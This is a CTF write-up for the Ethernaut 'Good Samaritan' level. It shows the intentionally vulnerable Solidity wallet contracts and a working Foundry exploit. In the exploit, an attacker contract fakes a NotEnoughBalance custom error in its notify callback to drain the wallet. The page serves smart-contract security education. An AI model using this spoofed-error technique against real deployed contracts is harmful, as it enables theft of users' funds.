---
title: "Good-Samaritan"
date: "2024-02-25T10:54:00.000Z"
lastmod: "2024-03-10T14:33:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Double-Entry-Point-4add59a518494b4b8275112702b0ec07"
weight: 28
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/27"
next: "Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "6e915bab-6303-4c2e-b529-ae24083e3523"
  created_time: "2024-02-25T10:54:00.000Z"
  last_edited_time: "2024-03-10T14:33:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel27.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Double-Entry-Point-4add59a518494b4b8275112702b0ec07"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Double-Entry-Point-4add59a518494b4b8275112702b0ec07"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 28
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/27"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper-Three-5c1ce9c7f1414b5fb252ec899aa78e83"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Good-Samaritan"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Good-Samaritan"
          href: null
  url: "https://www.notion.so/Good-Samaritan-6e915bab63034c2eb529ae24083e3523"
  public_url: null
UPDATE_TIME: "2024-03-11T18:08:22.986Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.


Would you be able to drain all the balance from his Wallet?


Things that might help:

- [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,GoodSamaritan} from '../src/27.sol';

contract POC is Script {

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_27");

        vm.startBroadcast(deployerPrivateKey);

        GoodSamaritan goodSamaritan = GoodSamaritan(addr);
        Attacker attacker = new Attacker();

        attacker.attack(goodSamaritan);

        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../lib/forge-std/src/console.sol";

interface GoodSamaritan {
  function requestDonation() external returns(bool enoughBalance);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract Attacker is INotifyable {

  error NotEnoughBalance();

  function notify(uint256 value) external pure {
    if (value == 10) {
      revert NotEnoughBalance();
    }
  }

  function attack(GoodSamaritan goodSamaritan) public {
    goodSamaritan.requestDonation();
  }
}
```


Congratulations!


Custom errors in Solidity are identified by their 4-byte ‘selector’, 
the same as a function call. They are bubbled up through the call chain 
until they are caught by a catch statement in a try-catch block, as seen
 in the GoodSamaritan's `requestDonation()` function. For 
these reasons, it is not safe to assume that the error was thrown by the
 immediate target of the contract call (i.e., Wallet in this case). Any 
other contract further down in the call chain can declare the same error
 and throw it at an unexpected location, such as in the `notify(uint256 amount)` function in your attacker contract.

